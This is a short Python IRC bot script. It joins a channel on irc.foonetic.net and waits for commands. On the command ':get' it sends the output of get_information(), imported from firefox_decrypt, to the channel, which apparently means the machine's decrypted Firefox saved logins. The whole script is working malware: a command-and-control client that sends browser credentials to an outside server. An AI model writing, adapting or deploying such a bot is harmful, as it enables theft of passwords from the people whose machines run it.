import socket
import numpy as np
import random
from firefox_decrypt import *

bot_owner = "QuyenVu"
botID = str( random.randint(1,1000))
nick = "bot" + botID
chan = "#cisdem"
sock = socket.socket()
sock.connect(("irc.foonetic.net",6667))
sock.send("USER " + nick + " 0 * :" + bot_owner + "\r\n")
sock.send("NICK " + nick + "\r\n")
while 1:
   data = sock.recv(512)
   command = data.split(" ")[-1].strip()
   print "Command is: ", command


   if command == ":get":
      a = format(get_information())
      print a
      sock.send("PRIVMSG " + chan + " :{0}\r\n".format(a))

   if data[0:4] == "PING":
      sock.send(data.replace("PING", "PONG"))
   if data[0]!=':':
      continue
   if data.split(" ")[1] == "001":
      sock.send("MODE " + nick + " +B\r\n")
      sock.send("JOIN " + chan + "\r\n")
   elif data.split(" ")[1] == "PRIVMSG" and data.split(":")[2].startswith(nick):
      sock.send("PRIVMSG " + chan + " :Someone just spoke to me!\r\n")